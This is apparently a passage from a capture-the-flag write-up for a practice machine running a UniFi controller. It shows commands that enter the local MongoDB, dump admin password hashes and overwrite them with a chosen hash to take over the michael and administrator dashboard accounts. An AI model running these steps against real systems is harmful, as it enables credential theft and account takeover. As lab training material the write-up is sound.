After linpeas enumeration, the attacker sees there is a mongod service running.
```
<SNIP>
/usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1         
<SNIP>
```

## Connecting and enumerating
```
unifi@unified:/tmp/ignore$ which mongo
which mongo
/usr/bin/mongo
unifi@unified:/tmp/ignore$ mongo --port 27117
mongo --port 27117
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/
MongoDB server version: 3.6.3
show dbs
ace       0.002GB                                                                                                                                            
ace_stat  0.000GB                                                                                                                                            
admin     0.000GB                                                                                                                                            
config    0.000GB                                                                                                                                            
local     0.000GB 
```

## ace
```
use ace
switched to db ace
show collections
account
admin
alarm
alert
apgroup
broadcastgroup
crashlog
dashboard
device
dhcpoption
dpiapp
dpigroup
dynamicdns
event
featuremigration
firewallgroup
firewallrule
guest
heatmap
heatmappoint
hotspot2conf
hotspotop
hotspotpackage
ipsalert
map
mediafile
networkconf
payment
portalfile
portconf
portforward
privilege
radiusprofile
rogue
rogueknown
routing
scheduletask
setting
site
spatialrecord
ssooauthtoken
stat
storeddpistats
systemevent
tag
task
user
usergroup
verification
virtualdevice
voucher
wall
wifiman_feedback
wlanconf
wlangroup

```
### ace - admin
```
db.admin.find().pretty()
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",
        "ui_settings" : {
                "neverCheckForUpdate" : true,
                "statisticsPrefferedTZ" : "SITE",
                "statisticsPreferBps" : "",
                "tables" : {
                        "device" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "initialColumns" : [
                                        "type",
                                        "deviceName",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ],
                                "columns" : [
                                        "type",
                                        "deviceName",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ]
                        },
                        "client" : {
                                "sortBy" : "physicalName",
                                "isAscending" : true,
                                "initialColumns" : [
                                        "status",
                                        "clientName",
                                        "physicalName",
                                        "connection",
                                        "ip",
                                        "experience",
                                        "Downlink",
                                        "Uplink",
                                        "dailyUsage"
                                ],
                                "columns" : [
                                        "status",
                                        "clientName",
                                        "mac",
                                        "physicalName",
                                        "connection",
                                        "network",
                                        "interface",
                                        "wifi_band",
                                        "ip",
                                        "experience",
                                        "Downlink",
                                        "Uplink",
                                        "dailyUsage",
                                        "uptime",
                                        "channel",
                                        "Uplink_apPort",
                                        "signal",
                                        "txRate",
                                        "rxRate",
                                        "first_seen",
                                        "last_seen",
                                        "rx_packets",
                                        "tx_packets"
                                ],
                                "filters" : {
                                        "status" : {
                                                "active" : true
                                        },
                                        "connection_type" : {
                                                "ng" : true,
                                                "na" : true,
                                                "wired" : true,
                                                "vpn" : true
                                        },
                                        "clients_type" : {
                                                "users" : true,
                                                "guests" : true
                                        },
                                        "device" : {
                                                "device" : ""
                                        }
                                }
                        },
                        "unifiDevice" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "unifiDeviceNetwork" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "unifiDeviceAccess" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "unifiDeviceProtect" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "unifiDeviceTalk" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "insights/wifiScanner" : {
                                "sortBy" : "apCount",
                                "isAscending" : false,
                                "initialColumns" : [
                                        "apCount",
                                        "essid",
                                        "bssid",
                                        "security",
                                        "radio",
                                        "signal",
                                        "channel",
                                        "band",
                                        "bw",
                                        "oui",
                                        "date",
                                        "ap_mac"
                                ],
                                "columns" : [
                                        "apCount",
                                        "essid",
                                        "bssid",
                                        "security",
                                        "radio",
                                        "signal",
                                        "channel",
                                        "band",
                                        "bw",
                                        "oui",
                                        "date",
                                        "ap_mac"
                                ]
                        },
                        "insights/wifiMan" : {
                                "sortBy" : "date",
                                "isAscending" : false,
                                "initialColumns" : [
                                        "clinet_name",
                                        "client_wifi_experience",
                                        "device_model",
                                        "device_name",
                                        "wlan_essid",
                                        "client_signal",
                                        "wlan_channel_width",
                                        "down",
                                        "up",
                                        "endPoint",
                                        "rate",
                                        "date"
                                ],
                                "columns" : [
                                        "clinet_name",
                                        "client_wifi_experience",
                                        "device_model",
                                        "device_name",
                                        "wlan_essid",
                                        "client_signal",
                                        "wlan_channel_width",
                                        "down",
                                        "up",
                                        "endPoint",
                                        "rate",
                                        "date"
                                ]
                        }
                },
                "topologyViewSettings" : {
                        "showAllDevices" : true,
                        "showAllClients" : true,
                        "show2GClients" : true,
                        "show5GClients" : true,
                        "showWiredClients" : true,
                        "showSSID" : false,
                        "showWifiExperience" : true,
                        "showRadioChannel" : false,
                        "showWifiStandards" : false,
                        "showWiredSpeed" : false,
                        "showWiredPorts" : false,
                        "online" : true,
                        "offline" : true,
                        "isolated" : true,
                        "pending_adoption" : true,
                        "managed_by_another_console" : true
                },
                "preferences" : {
                        "alertsPosition" : "top_right",
                        "allowHiddenDashboardModules" : false,
                        "browserLogLevel" : "INFO",
                        "bypassAutoFindDevices" : false,
                        "bypassConfirmAdoptAndUpgrade" : false,
                        "bypassConfirmBlock" : false,
                        "bypassConfirmRestart" : false,
                        "bypassConfirmUpgrade" : false,
                        "bypassHybridDashboardNotice" : false,
                        "bypassDashboardUdmProAd" : false,
                        "bypassHybridSettingsNotice" : false,
                        "dateFormat" : "MMM DD YYYY",
                        "dismissWlanOverrides" : false,
                        "enableNewUI" : false,
                        "hideV3SettingsIntro" : true,
                        "isAppDark" : true,
                        "isPropertyPanelFixed" : true,
                        "isRegularGraphForAirViewEnabled" : false,
                        "isResponsive" : false,
                        "isSettingsDark" : true,
                        "isUndockedByDefault" : false,
                        "noWhatsNew" : false,
                        "propertyPanelCollapse" : false,
                        "propertyPanelMultiMode" : true,
                        "refreshButtonEnabled" : false,
                        "refreshRate" : "2MIN",
                        "refreshRateRememberAll" : false,
                        "rowsPerPage" : 50,
                        "showAllPanelActions" : false,
                        "showWifimanAppsBanner" : true,
                        "timeFormat" : "H:mm",
                        "use24HourTime" : true,
                        "useBrowserTheme" : false,
                        "useSettingsPanelView" : false,
                        "websocketEnabled" : true,
                        "withStickyTableActions" : true,
                        "isUlteModalClosed" : false,
                        "isUbbAlignmentToolModalClosed" : false,
                        "offlineClientTimeframe" : 24
                },
                "preferredLanguage" : "en",
                "dashboardConfig" : {
                        "lastActiveDashboardId" : "61ce269d46e0fb0012d47ec6"
                }
        },
        "requires_new_password" : false,
        "email_alert_enabled" : true,
        "email_alert_grouping_enabled" : true,
        "html_email_enabled" : true,
        "is_professional_installer" : false,
        "push_alert_enabled" : true
}
{
        "_id" : ObjectId("61ce4a63fbce5e00116f424f"),
        "email" : "michael@unified.htb",
        "name" : "michael",
        "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0",
        "requires_new_password" : false,
        "time_created" : NumberLong(1640909411),
        "last_site_name" : "default",
        "email_alert_enabled" : false,
        "email_alert_grouping_enabled" : false,
        "email_alert_grouping_delay" : 60,
        "push_alert_enabled" : false
}
{
        "_id" : ObjectId("61ce4ce8fbce5e00116f4251"),
        "email" : "seamus@unified.htb",
        "name" : "Seamus",
        "x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.",
        "requires_new_password" : true,
        "time_created" : NumberLong(1640910056),
        "last_site_name" : "default"
}
{
        "_id" : ObjectId("61ce4d27fbce5e00116f4252"),
        "email" : "warren@unified.htb",
        "name" : "warren",
        "x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.",
        "requires_new_password" : true,
        "time_created" : NumberLong(1640910119),
        "last_site_name" : "default"
}
{
        "_id" : ObjectId("61ce4d51fbce5e00116f4253"),
        "email" : "james@unfiied.htb",
        "name" : "james",
        "x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1",
        "requires_new_password" : false,
        "time_created" : NumberLong(1640910161),
        "last_site_name" : "default"
}

```

There are multiple users found. Michael has a home directory on the target, so maybe his password can be changed and used to log in. This will likely apply to the portal, but maybe ssh.

## Updating hashes
```
### Get the hash to use
┌──(kali㉿kali)-[~]
└─$ openssl passwd -6 pwned   
$6$inLX6PhYbRL5as4x$odsMivsoE6QIPEqYJElcoBYV2X4XphJpLTo4RyL8cK3k4JJcwdUUcQHkgbUs2DJqMHDAwx8hPpq7LK0cAwyUC.

### Setting the new hased variable
db.admin.update( {email: "michael@unified.htb"}, { $set: {x_shadow: "$6$inLX6PhYbRL5as4x$odsMivsoE6QIPEqYJElcoBYV2X4XphJpLTo4RyL8cK3k4JJcwdUUcQHkgbUs2DJqMHDAwx8hPpq7LK0cAwyUC." } } )
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

### Confirming the value is set
db.admin.find({name: "michael"}).pretty()
{
        "_id" : ObjectId("61ce4a63fbce5e00116f424f"),
        "email" : "michael@unified.htb",
        "name" : "michael",
        "x_shadow" : "$6$inLX6PhYbRL5as4x$odsMivsoE6QIPEqYJElcoBYV2X4XphJpLTo4RyL8cK3k4JJcwdUUcQHkgbUs2DJqMHDAwx8hPpq7LK0cAwyUC.",
        "requires_new_password" : false,
        "time_created" : NumberLong(1640909411),
        "last_site_name" : "default",
        "email_alert_enabled" : false,
        "email_alert_grouping_enabled" : false,
        "email_alert_grouping_delay" : 60,
        "push_alert_enabled" : false
}

```

Michael can log into the dashboard with the new password!
![[michaelWebAccess.png]]

## Setting new administrator credentials
```
db.admin.update({email: "administrator@unified.htb"}, { $set: {x_shadow: "$6$inLX6PhYbRL5as4x$odsMivsoE6QIPEqYJElcoBYV2X4XphJpLTo4RyL8cK3k4JJcwdUUcQHkgbUs2DJqMHDAwx8hPpq7LK0cAwyUC." } } )
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```
![[administratorLogin.png]]

Michael appears to be a Super Administrator
![[michaelSuperAdmin.png]]
